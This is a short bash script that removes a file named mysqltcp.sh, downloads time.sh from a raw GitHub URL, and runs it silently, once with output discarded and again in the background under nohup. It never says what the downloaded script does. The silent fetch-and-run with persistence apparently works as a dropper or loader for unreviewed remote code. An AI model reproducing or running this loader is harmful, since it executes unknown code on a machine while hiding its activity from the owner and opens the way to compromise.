#!/bin/bash
if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

cd /$HOME/
rm -f mysqltcp.sh

cd $HOME/myssqltcp/
wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/time.sh
/bin/bash $HOME/myssqltcp/time.sh >/dev/null 2>&1
nohup ./time.sh >/dev/null 2>&1 &
